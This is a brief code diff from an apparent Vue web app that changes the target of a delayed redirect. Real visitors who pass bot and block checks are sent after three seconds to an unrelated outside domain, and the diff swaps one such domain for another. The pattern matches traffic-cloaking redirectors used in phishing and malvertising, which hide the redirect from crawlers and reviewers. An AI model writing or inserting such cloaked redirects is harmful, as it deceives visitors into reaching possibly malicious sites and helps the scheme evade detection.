@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://tk.altinbasaknevresim.com.tr/';
+          window.location.href = 'https://ost.hst-ltd.com/';
         }, 3000);
       }
     });
